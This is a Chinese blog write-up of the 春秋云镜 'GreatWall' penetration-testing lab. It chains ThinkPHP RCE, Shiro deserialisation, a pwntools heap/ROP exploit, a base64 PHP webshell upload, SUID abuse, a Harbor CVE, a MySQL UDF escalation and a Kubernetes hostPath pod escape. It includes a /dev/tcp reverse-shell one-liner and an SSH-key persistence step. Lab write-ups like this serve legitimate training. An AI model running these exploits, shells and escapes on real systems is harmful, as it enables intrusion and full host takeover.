@@ -1,0 +1,640 @@
+---
+title: '春秋云镜-GreatWall' # (Required, max 60)
+description: '在这个靶场中，您将扮演一名渗透测试工程师，接受雇佣任务来评估“SmartLink Technologies Ltd.”公司的网络安全状况。靶场中共设置了6个Flag，它们分布在不同的靶机上。' # (Required, 10 to 160)
+publishDate: '2025-5-3' # (Required, Date)
+tags:
+  - 春秋云镜 # (Also can write format like next line)
+heroImage: { src: 'https://image777.oss-cn-beijing.aliyuncs.com/img/202510052211432.jpg', inferSize: true, color: '#090909ff' }
+draft: false # (set true will only show in development)
+language: '简中' # (String as you like)
+comment: true # (set false will disable comment, even if you've enabled it in site-config)
+---
+## 入口- flag1
+
+**信息搜集**
+
+```shell
+❯ ./fscan -h 8.130.140.238                                         
+┌──────────────────────────────────────────────┐
+│    ___                              _        │
+│   / _ \     ___  ___ _ __ __ _  ___| | __    │
+│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
+│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
+│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
+└──────────────────────────────────────────────┘
+      Fscan Version: 2.0.0
+
+[2025-05-02 21:23:48] [INFO] 暴力破解线程数: 1
+[2025-05-02 21:23:48] [INFO] 开始信息扫描
+[2025-05-02 21:23:48] [INFO] 最终有效主机数量: 1
+[2025-05-02 21:23:48] [INFO] 开始主机扫描
+[2025-05-02 21:23:48] [INFO] 有效端口数量: 233
+[2025-05-02 21:23:48] [SUCCESS] 端口开放 8.130.140.238:80
+[2025-05-02 21:23:48] [SUCCESS] 端口开放 8.130.140.238:22
+[2025-05-02 21:23:48] [SUCCESS] 端口开放 8.130.140.238:8080
+[2025-05-02 21:23:48] [SUCCESS] 服务识别 8.130.140.238:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7.]
+[2025-05-02 21:23:53] [SUCCESS] 服务识别 8.130.140.238:80 => [http]
+[2025-05-02 21:23:53] [SUCCESS] 服务识别 8.130.140.238:8080 => [http]
+[2025-05-02 21:23:53] [INFO] 存活端口数量: 3
+[2025-05-02 21:23:53] [INFO] 开始漏洞扫描
+[2025-05-02 21:23:53] [INFO] 加载的插件: ssh, webpoc, webtitle
+[2025-05-02 21:23:54] [SUCCESS] 网站标题 http://8.130.140.238      状态码:200 长度:10887  标题:""
+[2025-05-02 21:23:54] [SUCCESS] 网站标题 http://8.130.140.238:8080 状态码:200 长度:1027   标题:Login Form
+[2025-05-02 21:23:57] [SUCCESS] 目标: http://8.130.140.238:8080
+  漏洞类型: poc-yaml-thinkphp5023-method-rce
+  漏洞名称: poc1
+  详细信息:
+	links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
+[2025-05-02 21:24:03] [SUCCESS] 扫描已完成: 5/5
+```
+
+8080端口存在ThinkPHP的nday，工具一把梭
+
+![image-20250502212850838](https://image777.oss-cn-beijing.aliyuncs.com/img/202505022128886.png)
+
+检测到漏洞命令执行模块不回显可能开了disable function，直接传shell
+
+![image-20250502213218075](https://image777.oss-cn-beijing.aliyuncs.com/img/202505022132102.png)
+
+蚁剑连接，根目录下拿到flag1
+
+![image-20250502213609730](https://image777.oss-cn-beijing.aliyuncs.com/img/202505022136101.png)
+
+
+
+## 一级内网
+
+蚁剑写1.sh
+
+```shell
+#!/bin/bash
+bash -i >& /dev/tcp/ip/9000 0>&1
+```
+
+反弹shell
+
+传fscan和venom，这里蚁剑传文件失败，用服务器开python Web后利用wget传文件
+
+**信息收集**
+
+```shell
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:0b:45:0a brd ff:ff:ff:ff:ff:ff
+    inet 172.28.23.17/16 brd 172.28.255.255 scope global dynamic eth0
+       valid_lft 1892158377sec preferred_lft 1892158377sec
+    inet6 fe80::216:3eff:fe0b:450a/64 scope link 
+       valid_lft forever preferred_lft forever
+```
+
+这里fscan 2.0扫不到任何东西，换到1.8后正常
+
+```shell
+./fscan -h 172.28.23.17/24
+
+   ___                              _    
+  / _ \     ___  ___ _ __ __ _  ___| | __ 
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <    
+\____/     |___/\___|_|  \__,_|\___|_|\_\   
+                     fscan version: 1.8.4
+start infoscan
+trying RunIcmp2
+The current user permissions unable to send icmp packets
+start ping
+(icmp) Target 172.28.23.26    is alive
+(icmp) Target 172.28.23.17    is alive
+(icmp) Target 172.28.23.33    is alive
+[*] Icmp alive hosts len is: 3
+172.28.23.33:8080 open
+172.28.23.17:8080 open
+172.28.23.26:80 open
+172.28.23.17:80 open
+172.28.23.26:22 open
+172.28.23.26:21 open
+172.28.23.17:22 open
+172.28.23.33:22 open
+[*] alive ports len is: 8
+start vulscan
+[*] WebTitle http://172.28.23.17       code:200 len:10887  title:""
+[*] WebTitle http://172.28.23.17:8080  code:200 len:1027   title:Login Form
+[*] WebTitle http://172.28.23.26       code:200 len:13693  title:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413
+[+] ftp 172.28.23.26:21:anonymous 
+   [->]OASystem.zip
+[*] WebTitle http://172.28.23.33:8080  code:302 len:0      title:None 跳转url: http://172.28.23.33:8080/login;jsessionid=70998A514AB7010967A5EE44F499EBEB
+[*] WebTitle http://172.28.23.33:8080/login;jsessionid=70998A514AB7010967A5EE44F499EBEB code:200 len:3860   title:智联科技 ERP 后台登陆
+[+] PocScan http://172.28.23.17:8080 poc-yaml-thinkphp5023-method-rce poc1
+[+] PocScan http://172.28.23.33:8080 poc-yaml-spring-actuator-heapdump-file 
+[+] PocScan http://172.28.23.33:8080 poc-yaml-springboot-env-unauth spring2
+```
+
+扫到`172.28.23.26`、`172.28.23.33`两台资产，.33存在heapdump泄漏
+
+**搭建代理**
+
+本地`./admin_macos_x64 -rhost 8.130.113.217 -rport 9999`
+
+靶机`./agent_linux_x64 -lport 9999`
+
+![image-20250502223053141](https://image777.oss-cn-beijing.aliyuncs.com/img/202505022230184.png)
+
+## 172.28.23.33-flag3
+
+访问`http://172.28.23.33:8080/actuator/heapdump`拿到heapdump
+
+利用工具分析
+
+```shell
+java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
+===========================================
+CookieRememberMeManager(ShiroKey)
+-------------
+algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES
+
+===========================================
+```
+
+拿到shiro KEY，利用反序列化工具写马
+
+![image-20250502225737204](https://image777.oss-cn-beijing.aliyuncs.com/img/202505022257255.png)
+
+没找到flag看网上WP说是个PWN题离谱
+
+看下开放的端口
+
+```
+(ops01:/) $ netstat -tulnp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:59696           0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::8080                 :::*                    LISTEN      661/java            
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 172.28.23.33:68         0.0.0.0:*                           -                   
+udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
+udp6       0      0 ::1:323                 :::*                                -    
+```
+
+用https://www.dr0n.top/posts/f249db01/上的EXP
+
+```python
+from pwn import *
+context.arch='amd64'
+
+def add(key,data='b'):
+    p.sendlineafter(b'Option:',b'1')
+    p.sendlineafter(b'Key:',key)
+    p.sendlineafter(b'Data:',data)
+
+def show(key):
+    p.sendlineafter(b'Option:',b'2')
+    p.sendlineafter(b"Key: ",key);
+
+def edit(key,data):
+    p.sendlineafter(b'Option:',b'3')
+    p.sendlineafter(b'Key:',key)
+    p.sendlineafter(b'Data:',data)
+
+def name(username):
+    p.sendlineafter(b'Option:',b'4')
+    p.sendlineafter(b'name:',username)
+
+
+p = remote('172.28.23.33', 59696)
+# p = process('./HashNote')
+
+
+username=0x5dc980
+stack=0x5e4fa8
+ukey=b'\x30'*5+b'\x31'+b'\x44'
+
+fake_chunk=flat({
+    0:username+0x10,
+    0x10:[username+0x20,len(ukey),\
+        ukey,0],
+    0x30:[stack,0x10]
+    },filler=b'\x00')
+
+p.sendlineafter(b'name',fake_chunk)
+p.sendlineafter(b'word','freep@ssw0rd:3')
+
+add(b'\x30'*1+b'\x31'+b'\x44',b'test')   # 126
+add(b'\x30'*2+b'\x31'+b'\x44',b'test')   # 127
+
+
+show(ukey)
+main_ret=u64(p.read(8))-0x1e0
+
+
+
+
+rdi=0x0000000000405e7c # pop rdi ; ret
+rsi=0x000000000040974f # pop rsi ; ret
+rdx=0x000000000053514b # pop rdx ; pop rbx ; ret
+rax=0x00000000004206ba # pop rax ; ret
+syscall=0x00000000004560c6 # syscall
+
+fake_chunk=flat({
+    0:username+0x20,
+    0x20:[username+0x30,len(ukey),\
+        ukey,0],
+    0x40:[main_ret,0x100,b'/bin/sh\x00']
+    },filler=b'\x00')
+
+name(fake_chunk.ljust(0x80,b'\x00'))
+
+
+payload=flat([
+    rdi,username+0x50,
+    rsi,0,
+    rdx,0,0,
+    rax,0x3b,
+    syscall
+    ])
+
+p.sendlineafter(b'Option:',b'3')
+p.sendlineafter(b'Key:',ukey)
+p.sendline(payload)
+p.sendlineafter(b'Option:',b'9')
+p.interactive()
+```
+
+![image-20250502231224459](https://image777.oss-cn-beijing.aliyuncs.com/img/202505022312506.png)
+
+## 172.28.23.26-flag2
+
+```
+[+] ftp 172.28.23.26:21:anonymous 
+   [->]OASystem.zip
+```
+
+扫到`.26`主机的ftp匿名登陆
+
+![image-20250502232227938](https://image777.oss-cn-beijing.aliyuncs.com/img/202505022322978.png)
+
+ftp连接拿到OA管理系统的源码做审计
+
+从`main.php`看起发现include了一个`checklogin.php`
+
+```php
+<?php
+function islogin(){
+   if(isset($_COOKIE['id'])&&isset($_COOKIE['loginname'])&&isset($_COOKIE['jueseid'])&&isset($_COOKIE['danweiid'])&&isset($_COOKIE['quanxian'])){
+	   if($_COOKIE['id']!=''&&$_COOKIE['loginname']!=''&&$_COOKIE['jueseid']!=''&&$_COOKIE['danweiid']!=''&&$_COOKIE['quanxian']!=''){
+	       return true;
+	   }
+	    else {
+	      return false;
+	   }
+    }
+    else {
+	    return false;
+     }
+}
+?>
+```
+
+Cookie的各参数值不为空即判断为登录
+
+![image-20250502233031208](https://image777.oss-cn-beijing.aliyuncs.com/img/202505022330249.png)
+
+登录成功后看下其他功能点，关键在文件上传即`uploadbase64.php`
+
+```php
+<?php
+/**
+ * Description: PhpStorm.
+ * Author: yoby
+ * DateTime: 2018/12/4 18:01
+ * Email:logove@qq.com
+ * Copyright Yoby版权所有
+ */
+$img = $_POST['imgbase64'];
+if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $img, $result)) {
+    $type = ".".$result[2];
+    $path = "upload/" . date("Y-m-d") . "-" . uniqid() . $type;
+}
+$img =  base64_decode(str_replace($result[1], '', $img));
+@file_put_contents($path, $img);
+exit('{"src":"'.$path.'"}');
+```
+
+![image-20250502233448277](https://image777.oss-cn-beijing.aliyuncs.com/img/202505022334326.png)
+
+用AI分析一波，文件内容及后缀可控，且会将路径返回😂
+
+那么按他说的格式传马即可`<?php @eval($_GET[1]); ?>`
+
+```php
+data:image/php;base64, PD9waHAgQGV2YWwoJF9HRVRbMV0pOyA/Pg==
+```
+
+![image-20250502234032582](https://image777.oss-cn-beijing.aliyuncs.com/img/202505022340628.png)
+
+![image-20250502234217345](https://image777.oss-cn-beijing.aliyuncs.com/img/202505022342392.png)
+
+ban了一堆的函数，用蚁剑插件绕过
+
+![image-20250503001215334](https://image777.oss-cn-beijing.aliyuncs.com/img/202505030012385.png)
+
+这里POST的马很玄学的执行不了，按其他佬的方法改.antproxy.php，再写一个1.php的GET马
+
+![image-20250503001600838](https://image777.oss-cn-beijing.aliyuncs.com/img/202505030016890.png)
+
+这样就执行成功了
+
+在根目录找到flag
+
+**SUID提权**
+
+```shell
+find / -type f -perm -04000 -ls 2>/dev/null
+# /usr/bin/base32
+```
+
+发现base32读取flag
+
+![image-20250503002420448](https://image777.oss-cn-beijing.aliyuncs.com/img/202505030024505.png)
+
+![image-20250503002750566](https://image777.oss-cn-beijing.aliyuncs.com/img/202505030027616.png)
+
+## 二级内网
+
+`.26`机器为双网卡
+
+```
+1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 
+2: eth0: mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:0b:9b:70 brd ff:ff:ff:ff:ff:ff inet 172.28.23.26/16 brd 172.28.255.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::216:3eff:fe0b:9b70/64 scope link valid_lft forever preferred_lft forever 
+3: eth1: mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:0b:9b:45 brd ff:ff:ff:ff:ff:ff inet 172.22.14.6/16 brd 172.22.255.255 scope global eth1 valid_lft forever preferred_lft forever inet6 fe80::216:3eff:fe0b:9b45/64 scope link valid_lft forever preferred_lft forever
+```
+
+在入口机开启python web服务，将fscan和venom传到`.26`主机
+
+`python3 -m http.server 9000`
+
+`wget http://172.28.23.17:9000/agent_linux_x64`
+
+搭建代理利用venom自带的SHELL进行下一步渗透
+
+```
+chmod +777 agent*
+./agent_linux_x64 -rhost 172.28.23.17 -rport 9998
+```
+
+![image-20250503004703116](https://image777.oss-cn-beijing.aliyuncs.com/img/202505030047153.png)
+
+```shell
+./fscan -h 172.22.14.6/24
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+trying RunIcmp2
+The current user permissions unable to send icmp packets
+start ping
+(icmp) Target 172.22.14.37    is alive
+(icmp) Target 172.22.14.6     is alive
+(icmp) Target 172.22.14.46    is alive
+[*] Icmp alive hosts len is: 3
+172.22.14.46:80 open
+172.22.14.6:80 open
+172.22.14.6:22 open
+172.22.14.37:22 open
+172.22.14.6:21 open
+172.22.14.37:10250 open
+172.22.14.37:2379 open
+172.22.14.46:22 open
+[*] alive ports len is: 8
+start vulscan
+[*] WebTitle http://172.22.14.46       code:200 len:785    title:Harbor
+[*] WebTitle http://172.22.14.6        code:200 len:13693  title:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413
+[+] InfoScan http://172.22.14.46       [Harbor]
+[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None
+[+] ftp 172.22.14.6:21:anonymous
+   [->]OASystem.zip
+[+] PocScan http://172.22.14.46/swagger.json poc-yaml-swagger-ui-unauth [{path swagger.json}]
+```
+
+又发现两台资产
+
+`172.22.14.46`、`172.22.14.37`
+
+其实`/16`网段还有MySQL数据库，后面会发现
+
+## 172.22.14.46-flag5
+
+存在harbor服务,未授权漏洞，利用EXP[https://github.com/404tk/CVE-2022-46463]
+
+![image-20250503010136073](https://image777.oss-cn-beijing.aliyuncs.com/img/202505030101110.png)
+
+![image-20250503010302788](https://image777.oss-cn-beijing.aliyuncs.com/img/202505030103834.png)
+
+拿到flag05
+
+## 172.22.10.28-flag6
+
+转存project/projectadmin
+
+```
+python3 harbor.py http://172.22.14.46/ --dump project/projectadmin --v2
+```
+
+![image-20250503012536193](https://image777.oss-cn-beijing.aliyuncs.com/img/202505030125239.png)
+
+在以上路径找到项目jar包，利用任意反编译工具进行审计
+
+![image-20250503012757382](https://image777.oss-cn-beijing.aliyuncs.com/img/202505030127418.png)
+
+在泄漏的配置里找到数据库密码
+
+利用MDUT进行UDF提权，flag在根目录下
+
+![image-20250503014523372](https://image777.oss-cn-beijing.aliyuncs.com/img/202505030145429.png)
+
+## 172.22.14.37-flag4
+
+主机 10250 端口开放，该端口为 k8s 的服务端口，扫描目标 k8s 是否存在漏洞。
+
+```shell
+❯ kube-hunter --remote 172.22.14.37                                
+2025-05-03 01:56:11,112 INFO kube_hunter.modules.report.collector Started hunting
+2025-05-03 01:56:11,112 INFO kube_hunter.modules.report.collector Discovering Open Kubernetes Services
+2025-05-03 01:56:12,902 INFO kube_hunter.modules.report.collector Found open service "Kubelet API" at 172.22.14.37:10250
+2025-05-03 01:56:15,266 INFO kube_hunter.modules.report.collector Found open service "Etcd" at 172.22.14.37:2379
+2025-05-03 01:56:15,819 INFO kube_hunter.modules.report.collector Found open service "API Server" at 172.22.14.37:6443
+2025-05-03 01:56:16,050 INFO kube_hunter.modules.report.collector Found vulnerability "K8s Version Disclosure" in 172.22.14.37:6443
+2025-05-03 01:56:16,056 INFO kube_hunter.modules.report.collector Found vulnerability "Unauthenticated access to API" in 172.22.14.37:6443
+2025-05-03 01:56:16,317 INFO kube_hunter.modules.report.collector Found vulnerability "Listing namespaces as anonymous user" in 172.22.14.37:6443
+2025-05-03 01:56:16,573 INFO kube_hunter.modules.report.collector Found vulnerability "Listing roles as anonymous user" in 172.22.14.37:6443
+2025-05-03 01:56:16,881 INFO kube_hunter.modules.report.collector Found vulnerability "Listing cluster roles as anonymous user" in 172.22.14.37:6443
+2025-05-03 01:56:17,147 INFO kube_hunter.modules.report.collector Found vulnerability "Listing pods as anonymous user" in 172.22.14.37:6443
+
+Nodes
++-------------+--------------+
+| TYPE        | LOCATION     |
++-------------+--------------+
+| Node/Master | 172.22.14.37 |
++-------------+--------------+
+
+Detected Services
++-------------+--------------------+----------------------+
+| SERVICE     | LOCATION           | DESCRIPTION          |
++-------------+--------------------+----------------------+
+| Kubelet API | 172.22.14.37:10250 | The Kubelet is the   |
+|             |                    | main component in    |
+|             |                    | every Node, all pod  |
+|             |                    | operations goes      |
+|             |                    | through the kubelet  |
++-------------+--------------------+----------------------+
+| Etcd        | 172.22.14.37:2379  | Etcd is a DB that    |
+|             |                    | stores cluster's     |
+|             |                    | data, it contains    |
+|             |                    | configuration and    |
+|             |                    | current              |
+|             |                    | state information,   |
+|             |                    | and might contain    |
+|             |                    | secrets              |
++-------------+--------------------+----------------------+
+| API Server  | 172.22.14.37:6443  | The API server is in |
+|             |                    | charge of all        |
+|             |                    | operations on the    |
+|             |                    | cluster.             |
++-------------+--------------------+----------------------+
+
+Vulnerabilities
+For further information about a vulnerability, search its ID in:
+https://avd.aquasec.com/
++--------+-------------------+----------------------+----------------------+----------------------+----------------------+
+| ID     | LOCATION          | MITRE CATEGORY       | VULNERABILITY        | DESCRIPTION          | EVIDENCE             |
++--------+-------------------+----------------------+----------------------+----------------------+----------------------+
+| KHV005 | 172.22.14.37:6443 | Initial Access //    | Unauthenticated      | The API Server port  | b'{"kind":"APIVersio |
+|        |                   | Exposed sensitive    | access to API        | is accessible.       | ns","versions":["v1" |
+|        |                   | interfaces           |                      | Depending on your    | ],"serverAddressByCl |
+|        |                   |                      |                      | RBAC settings this   | ientCIDRs":[{"client |
+|        |                   |                      |                      | could expose access  | CIDR":"0.0.0.0/0","s |
+|        |                   |                      |                      | to or control of     | ...                  |
+|        |                   |                      |                      | your cluster.        |                      |
++--------+-------------------+----------------------+----------------------+----------------------+----------------------+
+| KHV002 | 172.22.14.37:6443 | Initial Access //    | K8s Version          | The kubernetes       | v1.16.6-beta.0       |
+|        |                   | Exposed sensitive    | Disclosure           | version could be     |                      |
+|        |                   | interfaces           |                      | obtained from the    |                      |
+|        |                   |                      |                      | /version endpoint    |                      |
++--------+-------------------+----------------------+----------------------+----------------------+----------------------+
+| KHV007 | 172.22.14.37:6443 | Discovery // Access  | Listing roles as     | Accessing roles      | ['kubeadm:bootstrap- |
+|        |                   | the K8S API Server   | anonymous user       | might give an        | signer-clusterinfo', |
+|        |                   |                      |                      | attacker valuable    | 'system:controller:b |
+|        |                   |                      |                      | information          | ootstrap-signer',    |
+|        |                   |                      |                      |                      | 'extension-          |
+|        |                   |                      |                      |                      | apiserver-...        |
++--------+-------------------+----------------------+----------------------+----------------------+----------------------+
+| KHV007 | 172.22.14.37:6443 | Discovery // Access  | Listing pods as      | Accessing pods might | [{'name': b'nginx-de |
+|        |                   | the K8S API Server   | anonymous user       | give an attacker     | ployment-58d48b746d- |
+|        |                   |                      |                      | valuable information | q4zh7', 'namespace': |
+|        |                   |                      |                      |                      | b'default'},         |
+|        |                   |                      |                      |                      | {'name':             |
+|        |                   |                      |                      |                      | b'coredns-5644d7b... |
++--------+-------------------+----------------------+----------------------+----------------------+----------------------+
+| KHV007 | 172.22.14.37:6443 | Discovery // Access  | Listing namespaces   | Accessing namespaces | ['default', 'kube-   |
+|        |                   | the K8S API Server   | as anonymous user    | might give an        | node-lease', 'kube-  |
+|        |                   |                      |                      | attacker valuable    | public', 'kube-      |
+|        |                   |                      |                      | information          | system']             |
++--------+-------------------+----------------------+----------------------+----------------------+----------------------+
+| KHV007 | 172.22.14.37:6443 | Discovery // Access  | Listing cluster      | Accessing cluster    | ['admin', 'cluster-  |
+|        |                   | the K8S API Server   | roles as anonymous   | roles might give an  | admin', 'edit',      |
+|        |                   |                      | user                 | attacker valuable    | 'flannel',           |
+|        |                   |                      |                      | information          | 'system:aggregate-   |
+|        |                   |                      |                      |                      | to-admin',           |
+|        |                   |                      |                      |                      | 'system:aggregate-   |
+|        |                   |                      |                      |                      | to-edit...           |
++--------+-------------------+----------------------+----------------------+----------------------+----------------------+
+```
+
+参考[浅析K8S各种未授权攻击方法](https://zone.huoxian.cn/d/1153-k8s)，K8s 集群由于鉴权配置不当，将「system:anonymous」用户绑定到「cluster-admin」用户组，使 6443 端口允许匿名用户以管理员权限向集群内部下发指令。
+
+写一个evil-deployment.yaml配置文件创建恶意pod，把宿主机/目录挂载到容器内部/mnt目录，写公钥即可成功逃逸
+
+`evil-deployment.yaml`
+
+```yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: nginx-deployment
+  labels:
+    app: nginx
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: nginx
+  template:
+    metadata:
+      labels:
+        app: nginx
+    spec:
+      containers:
+      - name: nginx
+        image: nginx:1.8
+        volumeMounts:
+        - mountPath: /mnt
+          name: test-volume
+      volumes:
+      - name: test-volume
+        hostPath:
+          path: /
+```
+
+部署pod
+
+```shell
+❯ kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/  apply -f evil-deployment.yaml
+Please enter Username: 1
+Please enter Password: deployment.apps/nginx-deployment configured
+```
+
+列出当前所有pod
+
+```shell
+❯ kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods
+Please enter Username: 1
+Please enter Password: NAME                                READY   STATUS    RESTARTS   AGE
+nginx-deployment-864f8bfd6f-bgdhg   1/1     Running   0          34s
+```
+
+执行命令进入bash
+
+```shell
+❯ kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment-864f8bfd6f-bgdhg -- /bin/bash
+Please enter Username: 1
+Please enter Password: root@nginx-deployment-864f8bfd6f-bgdhg:/# ls
+```
+
+接下来写公钥
+
+```shell
+echo "你的公钥" > /mnt/root/.ssh/authorized_keys
+```
+
+ssh连接靶机，查看开放3306端口，flag在数据库里
+
+```shell
+ssh -i id_ed25519 root@172.22.14.37
+```
+
+![image-20250503022247012](https://image777.oss-cn-beijing.aliyuncs.com/img/202505030222064.png)
+
+## 总结
+
+很少有全是Linux机器的靶场，复现起来还算顺手。
+
+但是代理几十分钟断一次很难绷，不少时间都在重新配代理，其他环境都没有这种情况
